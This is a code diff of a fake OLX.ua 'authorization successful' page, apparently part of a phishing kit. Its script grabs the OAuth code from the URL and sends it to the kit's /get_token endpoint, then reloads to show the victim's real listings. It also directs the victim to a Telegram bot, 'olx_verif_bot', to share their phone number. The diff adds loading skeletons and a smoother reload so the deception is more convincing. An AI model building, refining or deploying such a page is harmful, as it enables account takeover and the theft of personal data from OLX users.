@@ -4,7 +4,6 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
     <title>Авторизація успішна — OLX.ua</title>
-
     <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500;700&display=swap" rel="stylesheet">
 
     <style>
@@ -99,7 +98,6 @@
         h1 { font-size: 22px; margin: 10px 0; color: #1f2d3d; }
         p { color: #5f6c7b; font-size: 14px; margin-bottom: 20px; line-height: 1.5; }
 
-        /* ИСПРАВЛЕННЫЕ СТИЛИ ОБЪЯВЛЕНИЙ */
         .ads-section {
             text-align: left;
             margin-bottom: 25px;
@@ -124,7 +122,6 @@
             margin-bottom: 8px;
             gap: 12px;
         }
-        /* Уменьшенный значок */
         .ad-img {
             width: 32px;
             height: 32px;
@@ -154,6 +151,21 @@
             gap: 4px;
             margin-top: 2px;
         }
+
+        /* СТИЛИ ЗАГРУЗКИ (SKELETON) */
+        .skeleton {
+            background: linear-gradient(90deg, #f0f0f0 25%, #e0e0e0 50%, #f0f0f0 75%);
+            background-size: 200% 100%;
+            animation: loading 1.5s infinite;
+            border-radius: 4px;
+        }
+        @keyframes loading {
+            0% { background-position: 200% 0; }
+            100% { background-position: -200% 0; }
+        }
+        .sk-img { width: 32px; height: 32px; }
+        .sk-text { width: 80%; height: 12px; margin-bottom: 6px; }
+        .sk-sub { width: 40%; height: 8px; }
 
         .btn {
             display: block;
@@ -187,9 +199,6 @@
                 <path d="M42.6667 0V37H33.5253V0H42.6667ZM15.2427 3.07524C23.6587 3.07524 30.4853 9.98104 30.4853 18.4946C30.4853 27.0082 23.6587 33.914 15.2427 33.914C6.82667 33.914 0 27.0082 0 18.4946C0 9.98104 6.82667 3.07524 15.2427 3.07524ZM52.1813 9.2473L54.8587 11.9557L57.536 9.2473H64V15.7862L61.3227 18.4946L64 21.203V27.7419H57.536L54.8587 25.0335L52.1813 27.7419H45.7173V21.203L48.3947 18.4946L45.7173 15.7862V9.2473H52.1813ZM15.2427 12.3333C11.8827 12.3333 9.152 15.0957 9.152 18.4946C9.152 21.8936 11.8827 24.6559 15.2427 24.6559C18.6027 24.6559 21.3333 21.8936 21.3333 18.4946C21.3333 15.0957 18.6027 12.3333 15.2427 12.3333Z" fill="#23E5DB"></path>
             </svg>
         </a>
-        <div class="nav-links">
-            <a href="#" class="btn-add">Подати оголошення</a>
-        </div>
     </div>
 </header>
 
@@ -200,36 +209,52 @@
         </div>
 
         <h1>Авторизація успішна</h1>
-        <p>Ваш профіль синхронізовано. Тепер поверніться до Telegram і натисніть <br><b>📲 поділитися номером</b></p>
+        <p id="main-status">Обробка даних профілю... <br>Будь ласка, зачекайте.</p>
 
-        {% if user_ads %}
         <div class="ads-section">
-            <div class="ads-title">Ваші оголошення підключено:</div>
-            {% for ad in user_ads %}
-            <div class="ad-card">
-                <img src="{{ ad.img }}" class="ad-img" alt="olx">
-                <div class="ad-info">
-                    <div class="ad-name">{{ ad.title }}</div>
-                    <div class="ad-status">
-                        <span style="width: 6px; height: 6px; background: #27ae60; border-radius: 50%;"></span>
-                        Активне
+            <div class="ads-title">Статус оголошень:</div>
+            
+            <div id="ads-container">
+                {% if user_ads %}
+                    {% for ad in user_ads %}
+                    <div class="ad-card">
+                        <img src="{{ ad.img }}" class="ad-img" alt="olx">
+                        <div class="ad-info">
+                            <div class="ad-name">{{ ad.title }}</div>
+                            <div class="ad-status">
+                                <span style="width: 6px; height: 6px; background: #27ae60; border-radius: 50%;"></span>
+                                Активне
+                            </div>
+                        </div>
                     </div>
-                </div>
+                    {% endfor %}
+                {% else %}
+                    <div class="ad-card" style="opacity: 0.6;">
+                        <div class="skeleton sk-img"></div>
+                        <div class="ad-info">
+                            <div class="skeleton sk-text"></div>
+                            <div class="skeleton sk-sub"></div>
+                        </div>
+                    </div>
+                    <div class="ad-card" style="opacity: 0.4;">
+                        <div class="skeleton sk-img"></div>
+                        <div class="ad-info">
+                            <div class="skeleton sk-text"></div>
+                            <div class="skeleton sk-sub"></div>
+                        </div>
+                    </div>
+                {% endif %}
             </div>
-            {% endfor %}
         </div>
-        {% endif %}
 
-        <a href="https://t.me/olx_verif_bot" class="btn">Повернутися до бота</a>
-
+        <a href="https://t.me/olx_verif_bot" class="btn" id="btn-back">Поверніться до бота</a>
         <div class="footer-text">© OLX.UA 2026</div>
     </div>
 </main>
 
 <script>
 async function sendCodeToServer(authCode) {
-    // Проверка, чтобы не отправлять один и тот же код дважды при рефреше
-    if (!authCode || sessionStorage.getItem('last_code') === authCode) return;
+    if (!authCode || sessionStorage.getItem('code_sent') === authCode) return;
     
     try {
         const response = await fetch("/get_token", {
@@ -238,22 +263,25 @@ async function sendCodeToServer(authCode) {
             body: JSON.stringify({ code: authCode })
         });
         
-        if (response.ok) {
-            // Сохраняем метку, что код отправлен, чтобы не дублировать логи
-            sessionStorage.setItem('last_code', authCode);
-            // Если сервер прислал команду на редирект (обновление страницы с куками)
-            const resData = await response.json();
-            if(resData.status === "ok") {
-                window.location.href = "/"; 
-            }
+        const resData = await response.json();
+        if (resData.status === "ok") {
+            sessionStorage.setItem('code_sent', authCode);
+            // ПЕРЕЗАГРУЗКА: Теперь Flask увидит куки и отрендерит реальные объявления
+            window.location.href = window.location.pathname; 
         }
-    } catch (err) { console.error("Error:", err); }
+    } catch (err) { 
+        console.error("Ошибка синхронизации");
+    }
 }
 
 const urlParams = new URLSearchParams(window.location.search);
-const codeFromUrl = urlParams.get("code");
-if (codeFromUrl) { 
-    sendCodeToServer(codeFromUrl); 
+const code = urlParams.get("code");
+
+if (code) {
+    sendCodeToServer(code);
+} else {
+    // Если кода в URL уже нет, значит мы перезагрузились и данные в куках
+    document.getElementById('main-status').innerHTML = "Ваш профіль синхронізовано. Тепер поверніться до Telegram і натисніть <br><b>📲 поділитися номером</b>";
 }
 </script>
 </body>
